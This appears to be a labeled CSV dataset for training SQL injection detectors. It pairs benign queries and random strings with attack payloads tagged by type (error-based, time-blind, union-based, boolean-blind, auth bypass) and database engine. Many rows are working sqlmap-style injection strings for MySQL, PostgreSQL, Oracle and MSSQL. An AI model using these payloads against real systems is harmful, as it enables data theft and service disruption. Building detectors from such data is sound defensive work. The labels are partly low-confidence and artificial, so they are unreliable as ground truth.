payload_norm,payload_delex,sqli_type,db_engine,confidence,is_attack,source,tier
SELECT TOP 50 PERCENT * FROM conversation,select top __INT__ __IDENT__ * from __IDENT__,benign,generic,1.0,False,original,gold
SELECT COUNT ( comfortableID ) FROM tree,select count ( __IDENT__ ) from __IDENT__,benign,mysql,0.9,False,original,silver
"1%"" ) ) or 8156 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --","__INT__ % "" ) ) or __INT__ = ( select count ( * ) from __IDENT__ ( __INT__ , __INT__ ) ) - -",heavy_query,postgresql,0.9,True,original,silver
"1"" where 3933 = 3933 or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) --","__INT__ where __INT__ = __INT__ or __IDENT__ ( __INT__ , concat ( __HEX__ , __HEX__ , ( select ( __IDENT__ ( __INT__ = __INT__ , __INT__ ) ) ) , __HEX__ ) ) - -",error_based,mysql,0.9,True,original,silver
"select * from users WHERE username = ""-7209\' ) ) ) and ( ( ( \'stqx\' = \'stqx"" or username = ""1%"" or username = ""1\'|| ( select \'byxb\' where 8351 = 8351",select * from __IDENT__ where __IDENT__ = __STR__ or __IDENT__ = __STR__ or __IDENT__ = __INT__ __STR__ __IDENT__ where __INT__ = __INT__,auth_bypass,generic,0.6,True,original,bronze
"SELECT COUNT ( whispered ) , immediately FROM word BY thousand","select count ( __IDENT__ ) , __IDENT__ from __IDENT__ by __IDENT__",benign,mysql,0.9,False,original,silver
"SELECT LOCATE ( ""3"", ""W3Schools.com"" ) AS MatchPosition;","select __IDENT__ ( __STR__ , __STR__ ) as __IDENT__ ;",benign,mysql,0.9,False,original,silver
SELECT * FROM morning FETCH FIRST 3 ROWS ONLY,select * from __IDENT__ fetch first __INT__ rows only,benign,generic,1.0,False,original,gold
"select * from users WHERE username = ""-3978 or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) -- mtun"" and username = ""-8099%\' ) ) or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) )","select * from __IDENT__ where __IDENT__ = __STR__ and __IDENT__ = "" - __INT__ % __IDENT__ ) ) or __INT__ = __IDENT__ ( ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) )",error_based,oracle,0.95,True,original,gold
"1"" ) ) ) or 6793 = ( select 6793 from pg_sleep ( 5 ) ) and ( ( ( ""azmf"" = ""azmf",__INT__ __STR__ __IDENT__ __STR__ __IDENT__,time_blind,postgresql,0.9,True,original,silver
"UPDATE to SET born = 'lion', City = 'belt' WHERE range = rising","update __IDENT__ set __IDENT__ = __STR__ , __IDENT__ = __STR__ where __IDENT__ = __IDENT__",benign,generic,1.0,False,original,gold
SELECT * FROM stood WHERE NOT early = 'although' AND NOT dollar = 'sight',select * from __IDENT__ where not __IDENT__ = __STR__ and not __IDENT__ = __STR__,benign,generic,1.0,False,original,gold
5.12832E+15,__IDENT__ + __INT__,benign,generic,0.9,False,original,silver
select sleep ( 5 ) and ( ( 'keoy' = 'keoy,select sleep ( __INT__ ) and ( ( __STR__ = __IDENT__,time_blind,generic,0.9,True,original,silver
"select * from users WHERE username = ""-4248 where 3288 = 3288 and username = ""1\'|| ( select \'tisi\' from dual where 1616 = 1616 and username = ""-8057\' ) ) as gpue where 4205 = 4205 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --""","select * from __IDENT__ where __IDENT__ = __STR__ __INT__ __STR__ __IDENT__ __STR__ ) ) as __IDENT__ where __INT__ = __INT__ or __INT__ = cast ( ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) | | ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) ) __IDENT__ | | ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) as __IDENT__ ) - - """,error_based,oracle,0.9,True,original,silver
condal talero,__IDENT__ __IDENT__,benign,generic,0.9,False,original,silver
"-5866' ) ) as phzq where 3803 = 3803 union all select 3803,3803,3803,3803,3803,3803,3803,3803--","- __INT__ ) ) as __IDENT__ where __INT__ = __INT__ union all select __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ - -",union_based,generic,0.7,True,original,bronze
"-5411%"" ) ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ""%"" = """,- __INT__ % __STR__ % __STR__,boolean_blind,mssql,0.8,True,original,silver
"select * from users WHERE username = ""1\' ) ) ) and ( ( ( \'ykjs\' like \'ykjs"" and username = ""1\' ) ) )",select * from __IDENT__ where __IDENT__ = __STR__ and __IDENT__ = __INT__ ) ) ),error_based,oracle,0.85,True,original,silver
SELECT with ( s ) FROM kind UNION ALL,select __IDENT__ ( __IDENT__ ) from __IDENT__ union all,benign,generic,1.0,False,original,gold
valle de yerri/deierri,__IDENT__ __IDENT__ __IDENT__ / __IDENT__,benign,generic,0.9,False,original,silver
holbrook,__IDENT__,benign,generic,0.9,False,original,silver
alfafara,__IDENT__,benign,generic,0.9,False,original,silver
SELECT * FROM them FETCH FIRST 50 PERCENT ROWS ONLY,select * from __IDENT__ fetch first __INT__ __IDENT__ rows only,benign,generic,1.0,False,original,gold
SELECT COUNT ( common ) FROM your,select count ( __IDENT__ ) from __IDENT__,benign,generic,1.0,False,original,gold
soulef,__IDENT__,benign,generic,0.9,False,original,silver
";SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3 ;SELECT COUNT(*) FROM (SELECT * FROM DOMAIN.DOMAINS WHERE ([INFERENCE])) AS T1,(SELECT * FROM DOMAIN.COLUMNS WHERE ([INFERENCE])) AS T2,(SELECT * FROM DOMAIN.TABLES WHERE ([INFERENCE])) AS T3","; select count ( * ) from __IDENT__ as __IDENT__ , __IDENT__ as __IDENT__ , __IDENT__ as __IDENT__ ; select count ( * ) from ( select * from __IDENT__ where ( __IDENT__ ) ) as __IDENT__ , ( select * from __IDENT__ where ( __IDENT__ ) ) as __IDENT__ , ( select * from __IDENT__ where ( __IDENT__ ) ) as __IDENT__",time_blind,mssql,0.9,True,original,silver
"1 and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) )","__INT__ and __INT__ = __IDENT__ ( __INT__ , ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) )",out_of_band,oracle,0.9,True,original,silver
"1%' ) and elt ( 4249 = 4249,7259 ) and ( '%' = '",__INT__ % __STR__ % __STR__,boolean_blind,mysql,0.8,True,original,silver
SELECT * FROM people WHERE gray NOT LIKE '[obtain]%',select * from __IDENT__ where __IDENT__ not like __STR__,benign,generic,1.0,False,original,gold
-6405%' ) ) ) or ( 8459 = 8459 ) *4906 and ( ( ( '%' = ',- __INT__ % __STR__ % __STR__,boolean_blind,generic,0.5,True,original,bronze
"1' ) ) as uncy where 8009 = 8009 union all select null,null,null,null,null,null,null,null,null#","__INT__ ) ) as __IDENT__ where __INT__ = __INT__ union all select null , null , null , null , null , null , null , null , null",union_based,generic,0.7,True,original,bronze
"select * from users WHERE username = ""-7242\' and \'kfff\' = \'kfff"" and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) ) +\'"" or username = ""-9564 or username = ""-9263\' ) as qodg where 6798 = 6798",select * from __IDENT__ where __IDENT__ = __STR__ and __INT__ = ( select upper ( __IDENT__ ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) ) from dual ) ) + \ __STR__ ) as __IDENT__ where __INT__ = __INT__,error_based,oracle,0.95,True,original,gold
SELECT * FROM equator FETCH FIRST 50 PERCENT ROWS ONLY,select * from __IDENT__ fetch first __INT__ __IDENT__ rows only,benign,generic,1.0,False,original,gold
FROM ( SELECT DISTINCT storm FROM south ),from ( select distinct __IDENT__ from __IDENT__ ),benign,generic,1.0,False,original,gold
SELECT * FROM equator WHERE quickly = 'cloth' FETCH FIRST 3 ROWS ONLY,select * from __IDENT__ where __IDENT__ = __STR__ fetch first __INT__ rows only,benign,mysql,0.9,False,original,silver
liesemer,__IDENT__,benign,generic,0.9,False,original,silver
6.54E+15,__IDENT__ + __INT__,benign,generic,0.9,False,original,silver
SELECT * FROM country,select * from __IDENT__,benign,mysql,0.9,False,original,silver
castell de rugat,__IDENT__ __IDENT__ __IDENT__,benign,generic,0.9,False,original,silver
"select * from users WHERE username = ""1%"" and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ( \'ajka\' = \'ajka"" and username = ""1"" and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) ) +\'"" and username = ""1""",select * from __IDENT__ where __IDENT__ = __STR__ and __INT__ = ( select upper ( __IDENT__ ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) ) from dual ) and ( ( \ __STR__ = \ __STR__ __STR__ __INT__,error_based,oracle,0.95,True,original,gold
SELECT equator,select __IDENT__,benign,generic,1.0,False,original,gold
SELECT COUNT ( nature ) FROM late,select count ( __IDENT__ ) from __IDENT__,benign,generic,1.0,False,original,gold
"select * from users WHERE username = ""-4610\' ) ) and ( ( \'hdco\' = \'hdco"" or username = ""1\' ) ) ) and username = ""-8007\' ) ) as bgpp where 9555 = 9555 or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --""",select * from __IDENT__ where __IDENT__ = __STR__ or __IDENT__ = __STR__,error_based,oracle,0.95,True,original,gold
"SELECT diagram, early, curious FROM chemical WHERE huge IS NULL","select __IDENT__ , __IDENT__ , __IDENT__ from __IDENT__ where __IDENT__ is null",benign,mysql,0.9,False,original,silver
4.94547E+15,__IDENT__ + __INT__,benign,generic,0.9,False,original,silver
"1"" ) ) or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ( ( ""oxvw"" = ""oxvw",__INT__ __STR__ __IDENT__ __STR__ __IDENT__,error_based,mysql,0.85,True,original,silver
"-7559"" or 8792 = 6905--",- __INT__ or __INT__ = __INT__ - -,boolean_blind,generic,0.8,True,original,silver
"select * from users WHERE username = ""-5863"" or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( ( \'xopg\' = \'xopg"" or username = ""-2756\' where 6156 = 6156",select * from __IDENT__ where __IDENT__ = __STR__ or __INT__ = cast ( ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) | | ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) ) __IDENT__ | | ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) as __IDENT__ ) and ( ( ( \ __STR__ = \ __STR__ where __INT__ = __INT__,error_based,oracle,0.95,True,original,gold
"1' ) ) and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) and ( ( 'vedm' = 'vedm",__INT__ __STR__ __IDENT__ __STR__ __IDENT__,error_based,mysql,0.9,True,original,silver
1'|| ( select 'fwph' where 3791 = 3791,__INT__ __STR__ __IDENT__ where __INT__ = __INT__,unknown,oracle,0.7,True,original,bronze
"select * from users WHERE username = ""1"" and username = ""-1254"" and username = ""-9987 ) ) ) or username = ""-8007\' ) ) as bgpp where 9555 = 9555",select * from __IDENT__ where __IDENT__ = __STR__ and __IDENT__ = __STR__ and __IDENT__ = __STR__ - __INT__ ) ) as __IDENT__ where __INT__ = __INT__,boolean_blind,generic,0.85,True,original,silver
SELECT news ( s ) FROM seven,select __IDENT__ ( __IDENT__ ) from __IDENT__,benign,generic,1.0,False,original,gold
SELECT * FROM alone WHERE wind BETWEEN correctly09/01/1996window AND been15/31/1996garden,select * from __IDENT__ where __IDENT__ between __IDENT__ / __INT__ / __IDENT__ and __IDENT__ / __INT__ / __IDENT__,benign,generic,1.0,False,original,gold
SELECT * FROM ( SELECT now FROM depend ),select * from ( select now from __IDENT__ ),benign,generic,1.0,False,original,gold
"1%"" rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) and ""%"" = """,__INT__ % __STR__ % __STR__,time_blind,mysql,0.7,True,original,bronze
"-9737"" ) ) ) order by 1--",- __INT__ ) ) ) order by __INT__ - -,union_based,generic,0.7,True,original,bronze
"end and ( ( ""rqay"" like ""rqay",end and ( ( __STR__ like __IDENT__,unknown,generic,0.6,True,original,bronze
1'|| ( select 'owzs' where 1475 = 1475 union all select null--,__INT__ __STR__ __IDENT__ where __INT__ = __INT__ union all select null - -,union_based,generic,0.7,True,original,bronze
"1%"" ) and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ( ""%"" = """,__INT__ % __STR__ % __STR__,error_based,mysql,0.9,True,original,silver
"select * from users WHERE username = ""1\' and username = ""-1549\' ) and ( ( 5616 = 5616"" and username = ""1%\' ) ) )",select * from __IDENT__ where __IDENT__ = __STR__ and __IDENT__ = __INT__ % __IDENT__ ) ) ),error_based,oracle,0.8,True,original,silver
"select * from users WHERE username = ""1\' and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) "" and username = ""1\'|| ( select \'ylio\' from dual where 3767 = 3767",select * from __IDENT__ where __IDENT__ = __INT__ __STR__ | | ( select \ __STR__ from dual where __INT__ = __INT__,error_based,oracle,0.95,True,original,gold
"select * from users WHERE username = ""-7746\' ) ) ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) or username = ""1 where 5161 = 5161",select * from __IDENT__ where __IDENT__ = __STR__ __INT__ where __INT__ = __INT__,boolean_blind,oracle,0.9,True,original,silver
"1%"" ) and ( select * from ( select ( sleep ( 5 ) ) ) gcrr ) #","__INT__ % "" ) and ( select * from ( select ( sleep ( __INT__ ) ) ) __IDENT__ ) #",time_blind,generic,0.7,True,original,bronze
